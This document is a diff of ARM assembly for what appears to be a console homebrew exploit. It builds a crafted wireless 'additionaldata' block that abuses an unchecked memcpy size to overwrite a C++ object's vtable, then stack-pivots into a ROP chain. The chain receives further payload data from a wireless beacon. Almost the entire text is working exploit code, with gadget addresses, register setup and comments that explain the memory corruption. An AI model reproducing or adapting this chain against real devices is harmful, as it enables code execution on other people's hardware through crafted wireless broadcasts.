@@ -6,6 +6,10 @@
 #define ADDITIONALDATA_ADR 0x00c9d7d0
 #define STACKPIVOT_ADR 0x0012a4f4 //This stack-pivot gadget also exists in spider.
 #define POP_PC 0x0010b930
+#define POP_R0R4SLIPPC 0x001ca5b4 //pop {r0, r1, r2, r3, r4, sl, ip, pc}
+#define NWMUDS_RecvBeaconBroadcastData 0x00314860 //r0=outbuf, r1=size, r2=u8id, r3=wlancommID
+
+//#define STACKPIVOT_ADR 0x0012e264 //Addr for JPN full-game v1.0.
 
 #define POP_LRPC STACKPIVOT_ADR+0x8
 
@@ -28,6 +32,7 @@ _start:
 @ Neither of the below size fields are checked. In memory, the second data-block used with size1 for the memcpy is copied to: adr = buf0adr+size0 + (<value of s8 at additionaldata+0x2> * size1). Therefore, the size and the relative offset for the destination buffer can be controlled.
 @ This is used to trigger a memcpy with size 0x1898 with the data @ additionaldata+0x34, which then overwrites a c++ object. See below.
 
+additionaldata_start:
 .byte 0xff, 0xff
 .byte 0x04 @ s8, index?
 .byte 0xff
@@ -35,19 +40,43 @@ _start:
 .word 0x4 @ additionaldata+0x8, u32 size0. Normally this is 0x22, however with this haxx value 0x04 is used so that more space is available in the second block.
 .word 0x18A0 @ additionaldata+0xc, u32 size1
 .word 0xffffffff @ additionaldata+0x10. The data used with size0 for the memcpy begins here. The data used with the memcpy for size1 is located immediately after this block.
-.word ADDITIONALDATA_ADR @ additionaldata+0x14. Beginning of data which overwrites the c++ object. The ptr here overwrites the vtable ptr, therefore the vtable addr is overwritten with <addr of additionaldata+0>. (r0)
-.word 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff @ additionaldata+0x18 / object+0x4. (r1-r4)
-.word 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff @ additionaldata+0x28 / object+0x14. (r5-r8)
-.word 0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff @ additionaldata+0x38 / object+0x24. (r9, sl, fp, ip)
-.word ADDITIONALDATA_ADR+0x14+0x40 @ sp
+.word ADDITIONALDATA_ADR+0x24 @ additionaldata+0x14. Beginning of data which overwrites the c++ object. The ptr here overwrites the vtable ptr, therefore the vtable addr is overwritten with <addr of additionaldata+0x24>. (r0)
+.word 0xffffffff @ additionaldata+0x18 / object+0x4. (r1)
+.word 0xffffffff @ r2
+.word 0xffffffff @ r3
+.word 0xffffffff @ r4
+.word 0xffffffff @ r5
+.word 0xffffffff @ r6
+.word 0xffffffff @ r7
+.word 0xffffffff @ r8
+.word 0xffffffff @ r9
+.word 0xffffffff @ sl
+.word 0xffffffff @ fp
+.word 0xffffffff @ ip
+.word (ropstackstart-additionaldata_start) + ADDITIONALDATA_ADR @ sp
 .word POP_PC @ lr
 .word POP_PC @ pc
 
+.word 0, 0
+
 @ Stack begins here. Once the stack-pivot finishes, sp will be set to here, and "pop {pc}" will be executed.
-.word 0x58584148
+ropstackstart:
+.word POP_R0R4SLIPPC
+.word (roploadpos-additionaldata_start) + ADDITIONALDATA_ADR - 0xc @ r0, outbuf
+.word 0x400 @ r1, size
+.word 0 @ r2, u8 id
+.word 0x0014c110 @ r3, wlancommID
+.word 0 @ r4
+.word 0 @ sl
+.word 0 @ ip
 
-.fill ((_start + 0x34+0x90) - .), 1, 0xffffffff
-.word STACKPIVOT_ADR @ additionaldata+0x90. The application calls vtable funcptr +0x90 from the object overwritten above, after the haxx triggers. This results in control of PC(the data located at r0 is also controlled since that's the data overwritten by the above).
+.word NWMUDS_RecvBeaconBroadcastData @ Recv a beacon, with outbuf at TMPBUF_ADR.
 
-.fill ((_start + 0x34+0xb8) - .), 1, 0xffffffff
+roploadpos: @ When the process pops pc off the stack, data from the beacon will be located here. Currently this is just NWMUDS_RecvBeaconBroadcastData outbuf+0xc.
+
+@.word 0x58584148
+
+.fill ((_start + 0x34+0xb4) - .), 1, 0xffffffff
+
+.word STACKPIVOT_ADR @ additionaldata+0xb4(vtable+0x90). The application calls vtable funcptr +0x90 from the object overwritten above, after the haxx triggers. This results in control of PC(the data located at r0 is also controlled since that's the data overwritten by the above).
 
